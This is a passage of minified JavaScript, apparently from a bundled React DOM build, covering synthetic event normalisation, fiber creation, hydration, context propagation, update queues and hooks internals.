ao=o.slice(e,1<s?1-s:void 0)}function ro(e){var a=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&a===13&&(e=13)):e=a,e===10&&(e=13),32<=e||e===13?e:0}function to(){return!0}function Ec(){return!1}function ra(e){function a(t,s,o,n,c){this._reactName=t,this._targetInst=o,this.type=s,this.nativeEvent=n,this.target=c,this.currentTarget=null;for(var x in e)e.hasOwnProperty(x)&&(t=e[x],this[x]=t?t(n):n[x]);return this.isDefaultPrevented=(n.defaultPrevented!=null?n.defaultPrevented:n.returnValue===!1)?to:Ec,this.isPropagationStopped=Ec,this}return D(a.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=to)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=to)},persist:function(){},isPersistent:to}),a}var Xr={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},so=ra(Xr),Yt=D({},Xr,{view:0,detail:0}),Mp=ra(Yt),Xi,Bi,Kt,oo=D({},Yt,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Ui,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Kt&&(Kt&&e.type==="mousemove"?(Xi=e.screenX-Kt.screenX,Bi=e.screenY-Kt.screenY):Bi=Xi=0,Kt=e),Xi)},movementY:function(e){return"movementY"in e?e.movementY:Bi}}),Cc=ra(oo),Op=D({},oo,{dataTransfer:0}),Dp=ra(Op),Tp=D({},Yt,{relatedTarget:0}),Pi=ra(Tp),qp=D({},Xr,{animationName:0,elapsedTime:0,pseudoElement:0}),Np=ra(qp),Lp=D({},Xr,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),zp=ra(Lp),wp=D({},Xr,{data:0}),_c=ra(wp),Xp={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Bp={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Pp={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Up(e){var a=this.nativeEvent;return a.getModifierState?a.getModifierState(e):(e=Pp[e])?!!a[e]:!1}function Ui(){return Up}var Ip=D({},Yt,{key:function(e){if(e.key){var a=Xp[e.key]||e.key;if(a!=="Unidentified")return a}return e.type==="keypress"?(e=ro(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?Bp[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Ui,charCode:function(e){return e.type==="keypress"?ro(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?ro(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),kp=ra(Ip),Fp=D({},oo,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Mc=ra(Fp),Gp=D({},Yt,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Ui}),Vp=ra(Gp),Hp=D({},Xr,{propertyName:0,elapsedTime:0,pseudoElement:0}),Zp=ra(Hp),Qp=D({},oo,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Yp=ra(Qp),Kp=D({},Xr,{newState:0,oldState:0}),Wp=ra(Kp),Jp=[9,13,27,32],Ii=Ua&&"CompositionEvent"in window,Wt=null;Ua&&"documentMode"in document&&(Wt=document.documentMode);var $p=Ua&&"TextEvent"in window&&!Wt,Oc=Ua&&(!Ii||Wt&&8<Wt&&11>=Wt),Dc=" ",Tc=!1;function qc(e,a){switch(e){case"keyup":return Jp.indexOf(a.keyCode)!==-1;case"keydown":return a.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Nc(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var xt=!1;function eh(e,a){switch(e){case"compositionend":return Nc(a);case"keypress":return a.which!==32?null:(Tc=!0,Dc);case"textInput":return e=a.data,e===Dc&&Tc?null:e;default:return null}}function ah(e,a){if(xt)return e==="compositionend"||!Ii&&qc(e,a)?(e=Rc(),ao=wi=ir=null,xt=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(a.ctrlKey||a.altKey||a.metaKey)||a.ctrlKey&&a.altKey){if(a.char&&1<a.char.length)return a.char;if(a.which)return String.fromCharCode(a.which)}return null;case"compositionend":return Oc&&a.locale!=="ko"?null:a.data;default:return null}}var rh={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Lc(e){var a=e&&e.nodeName&&e.nodeName.toLowerCase();return a==="input"?!!rh[e.type]:a==="textarea"}function zc(e,a,t,s){mt?ut?ut.push(s):ut=[s]:mt=s,a=Ho(a,"onChange"),0<a.length&&(t=new so("onChange","change",null,t,s),e.push({event:t,listeners:a}))}var Jt=null,$t=null;function th(e){hu(e,0)}function io(e){var a=Ht(e);if(fc(a))return e}function wc(e,a){if(e==="change")return a}var Xc=!1;if(Ua){var ki;if(Ua){var Fi="oninput"in document;if(!Fi){var Bc=document.createElement("div");Bc.setAttribute("oninput","return;"),Fi=typeof Bc.oninput=="function"}ki=Fi}else ki=!1;Xc=ki&&(!document.documentMode||9<document.documentMode)}function Pc(){Jt&&(Jt.detachEvent("onpropertychange",Uc),$t=Jt=null)}function Uc(e){if(e.propertyName==="value"&&io($t)){var a=[];zc(a,$t,e,Ni(e)),Ac(th,a)}}function sh(e,a,t){e==="focusin"?(Pc(),Jt=a,$t=t,Jt.attachEvent("onpropertychange",Uc)):e==="focusout"&&Pc()}function oh(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return io($t)}function ih(e,a){if(e==="click")return io(a)}function nh(e,a){if(e==="input"||e==="change")return io(a)}function lh(e,a){return e===a&&(e!==0||1/e===1/a)||e!==e&&a!==a}var la=typeof Object.is=="function"?Object.is:lh;function es(e,a){if(la(e,a))return!0;if(typeof e!="object"||e===null||typeof a!="object"||a===null)return!1;var t=Object.keys(e),s=Object.keys(a);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var o=t[s];if(!rr.call(a,o)||!la(e[o],a[o]))return!1}return!0}function Ic(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function kc(e,a){var t=Ic(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=a&&s>=a)return{node:t,offset:a-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Ic(t)}}function Fc(e,a){return e&&a?e===a?!0:e&&e.nodeType===3?!1:a&&a.nodeType===3?Fc(e,a.parentNode):"contains"in e?e.contains(a):e.compareDocumentPosition?!!(e.compareDocumentPosition(a)&16):!1:!1}function Gc(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var a=$s(e.document);a instanceof e.HTMLIFrameElement;){try{var t=typeof a.contentWindow.location.href=="string"}catch{t=!1}if(t)e=a.contentWindow;else break;a=$s(e.document)}return a}function Gi(e){var a=e&&e.nodeName&&e.nodeName.toLowerCase();return a&&(a==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||a==="textarea"||e.contentEditable==="true")}var ch=Ua&&"documentMode"in document&&11>=document.documentMode,pt=null,Vi=null,as=null,Hi=!1;function Vc(e,a,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Hi||pt==null||pt!==$s(s)||(s=pt,"selectionStart"in s&&Gi(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),as&&es(as,s)||(as=s,s=Ho(Vi,"onSelect"),0<s.length&&(a=new so("onSelect","select",null,a,t),e.push({event:a,listeners:s}),a.target=pt)))}function Br(e,a){var t={};return t[e.toLowerCase()]=a.toLowerCase(),t["Webkit"+e]="webkit"+a,t["Moz"+e]="moz"+a,t}var ht={animationend:Br("Animation","AnimationEnd"),animationiteration:Br("Animation","AnimationIteration"),animationstart:Br("Animation","AnimationStart"),transitionrun:Br("Transition","TransitionRun"),transitionstart:Br("Transition","TransitionStart"),transitioncancel:Br("Transition","TransitionCancel"),transitionend:Br("Transition","TransitionEnd")},Zi={},Hc={};Ua&&(Hc=document.createElement("div").style,"AnimationEvent"in window||(delete ht.animationend.animation,delete ht.animationiteration.animation,delete ht.animationstart.animation),"TransitionEvent"in window||delete ht.transitionend.transition);function Pr(e){if(Zi[e])return Zi[e];if(!ht[e])return e;var a=ht[e],t;for(t in a)if(a.hasOwnProperty(t)&&t in Hc)return Zi[e]=a[t];return e}var Zc=Pr("animationend"),Qc=Pr("animationiteration"),Yc=Pr("animationstart"),dh=Pr("transitionrun"),mh=Pr("transitionstart"),uh=Pr("transitioncancel"),Kc=Pr("transitionend"),Wc=new Map,Qi="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");Qi.push("scrollEnd");function Ra(e,a){Wc.set(e,a),wr(a,[e])}var Jc=new WeakMap;function ba(e,a){if(typeof e=="object"&&e!==null){var t=Jc.get(e);return t!==void 0?t:(a={value:e,source:a,stack:pc(a)},Jc.set(e,a),a)}return{value:e,source:a,stack:pc(a)}}var ga=[],ft=0,Yi=0;function no(){for(var e=ft,a=Yi=ft=0;a<e;){var t=ga[a];ga[a++]=null;var s=ga[a];ga[a++]=null;var o=ga[a];ga[a++]=null;var n=ga[a];if(ga[a++]=null,s!==null&&o!==null){var c=s.pending;c===null?o.next=o:(o.next=c.next,c.next=o),s.pending=o}n!==0&&$c(t,o,n)}}function lo(e,a,t,s){ga[ft++]=e,ga[ft++]=a,ga[ft++]=t,ga[ft++]=s,Yi|=s,e.lanes|=s,e=e.alternate,e!==null&&(e.lanes|=s)}function Ki(e,a,t,s){return lo(e,a,t,s),co(e)}function bt(e,a){return lo(e,null,null,a),co(e)}function $c(e,a,t){e.lanes|=t;var s=e.alternate;s!==null&&(s.lanes|=t);for(var o=!1,n=e.return;n!==null;)n.childLanes|=t,s=n.alternate,s!==null&&(s.childLanes|=t),n.tag===22&&(e=n.stateNode,e===null||e._visibility&1||(o=!0)),e=n,n=n.return;return e.tag===3?(n=e.stateNode,o&&a!==null&&(o=31-na(t),e=n.hiddenUpdates,s=e[o],s===null?e[o]=[a]:s.push(a),a.lane=t|536870912),n):null}function co(e){if(50<Cs)throw Cs=0,tl=null,Error(m(185));for(var a=e.return;a!==null;)e=a,a=e.return;return e.tag===3?e.stateNode:null}var gt={};function xh(e,a,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=a,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function ca(e,a,t,s){return new xh(e,a,t,s)}function Wi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Ia(e,a){var t=e.alternate;return t===null?(t=ca(e.tag,a,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=a,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&65011712,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,a=e.dependencies,t.dependencies=a===null?null:{lanes:a.lanes,firstContext:a.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t.refCleanup=e.refCleanup,t}function ed(e,a){e.flags&=65011714;var t=e.alternate;return t===null?(e.childLanes=0,e.lanes=a,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=t.childLanes,e.lanes=t.lanes,e.child=t.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=t.memoizedProps,e.memoizedState=t.memoizedState,e.updateQueue=t.updateQueue,e.type=t.type,a=t.dependencies,e.dependencies=a===null?null:{lanes:a.lanes,firstContext:a.firstContext}),e}function mo(e,a,t,s,o,n){var c=0;if(s=e,typeof e=="function")Wi(e)&&(c=1);else if(typeof e=="string")c=ff(e,t,Ee.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(e){case qe:return e=ca(31,t,a,o),e.elementType=qe,e.lanes=n,e;case Y:return Ur(t.children,o,n,a);case G:c=8,o|=24;break;case K:return e=ca(12,t,a,o|2),e.elementType=K,e.lanes=n,e;case ze:return e=ca(13,t,a,o),e.elementType=ze,e.lanes=n,e;case Me:return e=ca(19,t,a,o),e.elementType=Me,e.lanes=n,e;default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case oe:case ye:c=10;break e;case Pe:c=9;break e;case Te:c=11;break e;case Je:c=14;break e;case I:c=16,s=null;break e}c=29,t=Error(m(130,e===null?"null":typeof e,"")),s=null}return a=ca(c,t,a,o),a.elementType=e,a.type=s,a.lanes=n,a}function Ur(e,a,t,s){return e=ca(7,e,s,a),e.lanes=t,e}function Ji(e,a,t){return e=ca(6,e,null,a),e.lanes=t,e}function $i(e,a,t){return a=ca(4,e.children!==null?e.children:[],e.key,a),a.lanes=t,a.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},a}var vt=[],jt=0,uo=null,xo=0,va=[],ja=0,Ir=null,ka=1,Fa="";function kr(e,a){vt[jt++]=xo,vt[jt++]=uo,uo=e,xo=a}function ad(e,a,t){va[ja++]=ka,va[ja++]=Fa,va[ja++]=Ir,Ir=e;var s=ka;e=Fa;var o=32-na(s)-1;s&=~(1<<o),t+=1;var n=32-na(a)+o;if(30<n){var c=o-o%5;n=(s&(1<<c)-1).toString(32),s>>=c,o-=c,ka=1<<32-na(a)+o|t<<o|s,Fa=n+e}else ka=1<<n|t<<o|s,Fa=e}function en(e){e.return!==null&&(kr(e,1),ad(e,1,0))}function an(e){for(;e===uo;)uo=vt[--jt],vt[jt]=null,xo=vt[--jt],vt[jt]=null;for(;e===Ir;)Ir=va[--ja],va[ja]=null,Fa=va[--ja],va[ja]=null,ka=va[--ja],va[ja]=null}var $e=null,Ce=null,le=!1,Fr=null,Oa=!1,rn=Error(m(519));function Gr(e){var a=Error(m(418,""));throw ss(ba(a,e)),rn}function rd(e){var a=e.stateNode,t=e.type,s=e.memoizedProps;switch(a[Ke]=e,a[aa]=s,t){case"dialog":re("cancel",a),re("close",a);break;case"iframe":case"object":case"embed":re("load",a);break;case"video":case"audio":for(t=0;t<Ms.length;t++)re(Ms[t],a);break;case"source":re("error",a);break;case"img":case"image":case"link":re("error",a),re("load",a);break;case"details":re("toggle",a);break;case"input":re("invalid",a),bc(a,s.value,s.defaultValue,s.checked,s.defaultChecked,s.type,s.name,!0),Js(a);break;case"select":re("invalid",a);break;case"textarea":re("invalid",a),vc(a,s.value,s.defaultValue,s.children),Js(a)}t=s.children,typeof t!="string"&&typeof t!="number"&&typeof t!="bigint"||a.textContent===""+t||s.suppressHydrationWarning===!0||vu(a.textContent,t)?(s.popover!=null&&(re("beforetoggle",a),re("toggle",a)),s.onScroll!=null&&re("scroll",a),s.onScrollEnd!=null&&re("scrollend",a),s.onClick!=null&&(a.onclick=Zo),a=!0):a=!1,a||Gr(e)}function td(e){for($e=e.return;$e;)switch($e.tag){case 5:case 13:Oa=!1;return;case 27:case 3:Oa=!0;return;default:$e=$e.return}}function rs(e){if(e!==$e)return!1;if(!le)return td(e),le=!0,!1;var a=e.tag,t;if((t=a!==3&&a!==27)&&((t=a===5)&&(t=e.type,t=!(t!=="form"&&t!=="button")||vl(e.type,e.memoizedProps)),t=!t),t&&Ce&&Gr(e),td(e),a===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(m(317));e:{for(e=e.nextSibling,a=0;e;){if(e.nodeType===8)if(t=e.data,t==="/$"){if(a===0){Ce=Ca(e.nextSibling);break e}a--}else t!=="$"&&t!=="$!"&&t!=="$?"||a++;e=e.nextSibling}Ce=null}}else a===27?(a=Ce,Sr(e.type)?(e=Al,Al=null,Ce=e):Ce=a):Ce=$e?Ca(e.stateNode.nextSibling):null;return!0}function ts(){Ce=$e=null,le=!1}function sd(){var e=Fr;return e!==null&&(oa===null?oa=e:oa.push.apply(oa,e),Fr=null),e}function ss(e){Fr===null?Fr=[e]:Fr.push(e)}var tn=Ue(null),Vr=null,Ga=null;function nr(e,a,t){ne(tn,a._currentValue),a._currentValue=t}function Va(e){e._currentValue=tn.current,be(tn)}function sn(e,a,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&a)!==a?(e.childLanes|=a,s!==null&&(s.childLanes|=a)):s!==null&&(s.childLanes&a)!==a&&(s.childLanes|=a),e===t)break;e=e.return}}function on(e,a,t,s){var o=e.child;for(o!==null&&(o.return=e);o!==null;){var n=o.dependencies;if(n!==null){var c=o.child;n=n.firstContext;e:for(;n!==null;){var x=n;n=o;for(var p=0;p<a.length;p++)if(x.context===a[p]){n.lanes|=t,x=n.alternate,x!==null&&(x.lanes|=t),sn(n.return,t,e),s||(c=null);break e}n=x.next}}else if(o.tag===18){if(c=o.return,c===null)throw Error(m(341));c.lanes|=t,n=c.alternate,n!==null&&(n.lanes|=t),sn(c,t,e),c=null}else c=o.child;if(c!==null)c.return=o;else for(c=o;c!==null;){if(c===e){c=null;break}if(o=c.sibling,o!==null){o.return=c.return,c=o;break}c=c.return}o=c}}function os(e,a,t,s){e=null;for(var o=a,n=!1;o!==null;){if(!n){if((o.flags&524288)!==0)n=!0;else if((o.flags&262144)!==0)break}if(o.tag===10){var c=o.alternate;if(c===null)throw Error(m(387));if(c=c.memoizedProps,c!==null){var x=o.type;la(o.pendingProps.value,c.value)||(e!==null?e.push(x):e=[x])}}else if(o===Xa.current){if(c=o.alternate,c===null)throw Error(m(387));c.memoizedState.memoizedState!==o.memoizedState.memoizedState&&(e!==null?e.push(Ls):e=[Ls])}o=o.return}e!==null&&on(a,e,t,s),a.flags|=262144}function po(e){for(e=e.firstContext;e!==null;){if(!la(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function Hr(e){Vr=e,Ga=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function We(e){return od(Vr,e)}function ho(e,a){return Vr===null&&Hr(e),od(e,a)}function od(e,a){var t=a._currentValue;if(a={context:a,memoizedValue:t,next:null},Ga===null){if(e===null)throw Error(m(308));Ga=a,e.dependencies={lanes:0,firstContext:a},e.flags|=524288}else Ga=Ga.next=a;return t}var ph=typeof AbortController<"u"?AbortController:function(){var e=[],a=this.signal={aborted:!1,addEventListener:function(t,s){e.push(s)}};this.abort=function(){a.aborted=!0,e.forEach(function(t){return t()})}},hh=i.unstable_scheduleCallback,fh=i.unstable_NormalPriority,we={$$typeof:ye,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function nn(){return{controller:new ph,data:new Map,refCount:0}}function is(e){e.refCount--,e.refCount===0&&hh(fh,function(){e.controller.abort()})}var ns=null,ln=0,yt=0,St=null;function bh(e,a){if(ns===null){var t=ns=[];ln=0,yt=dl(),St={status:"pending",value:void 0,then:function(s){t.push(s)}}}return ln++,a.then(id,id),a}function id(){if(--ln===0&&ns!==null){St!==null&&(St.status="fulfilled");var e=ns;ns=null,yt=0,St=null;for(var a=0;a<e.length;a++)(0,e[a])()}}function gh(e,a){var t=[],s={status:"pending",value:null,reason:null,then:function(o){t.push(o)}};return e.then(function(){s.status="fulfilled",s.value=a;for(var o=0;o<t.length;o++)(0,t[o])(a)},function(o){for(s.status="rejected",s.reason=o,o=0;o<t.length;o++)(0,t[o])(void 0)}),s}var nd=E.S;E.S=function(e,a){typeof a=="object"&&a!==null&&typeof a.then=="function"&&bh(e,a),nd!==null&&nd(e,a)};var Zr=Ue(null);function cn(){var e=Zr.current;return e!==null?e:ve.pooledCache}function fo(e,a){a===null?ne(Zr,Zr.current):ne(Zr,a.pool)}function ld(){var e=cn();return e===null?null:{parent:we._currentValue,pool:e}}var ls=Error(m(460)),cd=Error(m(474)),bo=Error(m(542)),dn={then:function(){}};function dd(e){return e=e.status,e==="fulfilled"||e==="rejected"}function go(){}function md(e,a,t){switch(t=e[t],t===void 0?e.push(a):t!==a&&(a.then(go,go),a=t),a.status){case"fulfilled":return a.value;case"rejected":throw e=a.reason,xd(e),e;default:if(typeof a.status=="string")a.then(go,go);else{if(e=ve,e!==null&&100<e.shellSuspendCounter)throw Error(m(482));e=a,e.status="pending",e.then(function(s){if(a.status==="pending"){var o=a;o.status="fulfilled",o.value=s}},function(s){if(a.status==="pending"){var o=a;o.status="rejected",o.reason=s}})}switch(a.status){case"fulfilled":return a.value;case"rejected":throw e=a.reason,xd(e),e}throw cs=a,ls}}var cs=null;function ud(){if(cs===null)throw Error(m(459));var e=cs;return cs=null,e}function xd(e){if(e===ls||e===bo)throw Error(m(483))}var lr=!1;function mn(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function un(e,a){e=e.updateQueue,a.updateQueue===e&&(a.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function cr(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function dr(e,a,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,(de&2)!==0){var o=s.pending;return o===null?a.next=a:(a.next=o.next,o.next=a),s.pending=a,a=co(e),$c(e,null,t),a}return lo(e,s,a,t),co(e)}function ds(e,a,t){if(a=a.updateQueue,a!==null&&(a=a.shared,(t&4194048)!==0)){var s=a.lanes;s&=e.pendingLanes,t|=s,a.lanes=t,ic(e,t)}}function xn(e,a){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var o=null,n=null;if(t=t.firstBaseUpdate,t!==null){do{var c={lane:t.lane,tag:t.tag,payload:t.payload,callback:null,next:null};n===null?o=n=c:n=n.next=c,t=t.next}while(t!==null);n===null?o=n=a:n=n.next=a}else o=n=a;t={baseState:s.baseState,firstBaseUpdate:o,lastBaseUpdate:n,shared:s.shared,callbacks:s.callbacks},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=a:e.next=a,t.lastBaseUpdate=a}var pn=!1;function ms(){if(pn){var e=St;if(e!==null)throw e}}function us(e,a,t,s){pn=!1;var o=e.updateQueue;lr=!1;var n=o.firstBaseUpdate,c=o.lastBaseUpdate,x=o.shared.pending;if(x!==null){o.shared.pending=null;var p=x,v=p.next;p.next=null,c===null?n=v:c.next=v,c=p;var C=e.alternate;C!==null&&(C=C.updateQueue,x=C.lastBaseUpdate,x!==c&&(x===null?C.firstBaseUpdate=v:x.next=v,C.lastBaseUpdate=p))}if(n!==null){var M=o.baseState;c=0,C=v=p=null,x=n;do{var y=x.lane&-536870913,S=y!==x.lane;if(S?(te&y)===y:(s&y)===y){y!==0&&y===yt&&(pn=!0),C!==null&&(C=C.next={lane:0,tag:x.tag,payload:x.payload,callback:null,next:null});e:{var Q=e,V=x;y=a;var pe=t;switch(V.tag){case 1:if(Q=V.payload,typeof Q=="function"){M=Q.call(pe,M,y);break e}M=Q;break e;case 3:Q.flags=Q.flags&-65537|128;case 0:if(Q=V.payload,y=typeof Q=="function"?Q.call(pe,M,y):Q,y==null)break e;M=D({},M,y);break e;case 2:lr=!0}}y=x.callback,y!==null&&(e.flags|=64,S&&(e.flags|=8192),S=o.callbacks,S===null?o.callbacks=[y]:S.push(y))}else S={lane:y,tag:x.tag,payload:x.payload,callback:x.callback,next:null},C===null?(v=C=S,p=M):C=C.next=S,c|=y;if(x=x.next,x===null){if(x=o.shared.pending,x===null)break;S=x,x=S.next,S.next=null,o.lastBaseUpdate=S,o.shared.pending=null}}while(!0);C===null&&(p=M),o.baseState=p,o.firstBaseUpdate=v,o.lastBaseUpdate=C,n===null&&(o.shared.lanes=0),gr|=c,e.lanes=c,e.memoizedState=M}}function pd(e,a){if(typeof e!="function")throw Error(m(191,e));e.call(a)}function hd(e,a){var t=e.callbacks;if(t!==null)for(e.callbacks=null,e=0;e<t.length;e++)pd(t[e],a)}var At=Ue(null),vo=Ue(0);function fd(e,a){e=Ja,ne(vo,e),ne(At,a),Ja=e|a.baseLanes}function hn(){ne(vo,Ja),ne(At,At.current)}function fn(){Ja=vo.current,be(At),be(vo)}var mr=0,W=null,ue=null,Ne=null,jo=!1,Rt=!1,Qr=!1,yo=0,xs=0,Et=null,vh=0;function Oe(){throw Error(m(321))}function bn(e,a){if(a===null)return!1;for(var t=0;t<a.length&&t<e.length;t++)if(!la(e[t],a[t]))return!1;return!0}function gn(e,a,t,s,o,n){return mr=n,W=a,a.memoizedState=null,a.updateQueue=null,a.lanes=0,E.H=e===null||e.memoizedState===null?$d:em,Qr=!1,n=t(s,o),Qr=!1,Rt&&(n=gd(a,t,s,o)),bd(e),n}function bd(e){E.H=_o;var a=ue!==null&&ue.next!==null;if(mr=0,Ne=ue=W=null,jo=!1,xs=0,Et=null,a)throw Error(m(300));e===null||ke||(e=e.dependencies,e!==null&&po(e)&&(ke=!0))}function gd(e,a,t,s){W=e;var o=0;do{if(Rt&&(Et=null),xs=0,Rt=!1,25<=o)throw Error(m(301));if(o+=1,Ne=ue=null,e.updateQueue!=null){var n=e.updateQueue;n.lastEffect=null,n.events=null,n.stores=null,n.memoCache!=null&&(n.memoCache.index=0)}E.H=Ch,n=a(t,s)}while(Rt);return n}function jh(){var e=E.H,a=e.useState()[0];return a=typeof a.then=="function"?ps(a):a,e=e.useState()[0],(ue!==null?ue.memoizedState:null)!==e&&(W.flags|=1024),a}function vn(){var e=yo!==0;return yo=0,e}function jn(e,a,t){a.updateQueue=e.updateQueue,a.flags&=-2053,e.lanes&=~t}function yn(e){if(jo){for(e=e.memoizedState;e!==null;){var a=e.queue;a!==null&&(a.pending=null),e=e.next}jo=!1}mr=0,Ne=ue=W=null,Rt=!1,xs=yo=0,Et=null}function ta(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Ne===null?W.memoizedState=Ne=e:Ne=Ne.next=e,Ne}function Le(){if(ue===null){var e=W.alternate;e=e!==null?e.memoizedState:null}else e=ue.next;var a=Ne===null?W.memoizedState:Ne.next;if(a!==null)Ne=a,ue=e;else{if(e===null)throw W.alternate===null?Error(m(467)):Error(m(310));ue=e,e={memoizedState:ue.memoizedState,baseState:ue.baseState,baseQueue:ue.baseQueue,queue:ue.queue,next:null},Ne===null?W.memoizedState=Ne=e:Ne=Ne.next=e}return Ne}function Sn(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function ps(e){var a=xs;return xs+=1,Et===null&&(Et=[]),e=md(Et,e,a),a=W,(Ne===null?a.memoizedState:Ne.next)===null&&(a=a.alternate,E.H=a===null||a.memoizedState===null?$d:em),e}function So(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return ps(e);if(e.$$typeof===ye)return We(e)}throw Error(m(438,String(e)))}function An(e){var a=null,t=W.updateQueue;if(t!==null&&(a=t.memoCache),a==null){var s=W.alternate;s!==null&&(s=s.updateQueue,s!==null&&(s=s.memoCache,s!=null&&(a={data:s.data.map(function(o){return o.slice()}),index:0})))}if(a==null&&(a={data:[],index:0}),t===null&&(t=Sn(),W.updateQueue=t),t.memoCache=a,t=a.data[a.index],t===void 0)for(t=a.data[a.index]=Array(e),s=0;s<e;s++)t[s]=Tr;return a.index++,t}function Ha(e,a){return typeof a=="function"?a(e):a}function 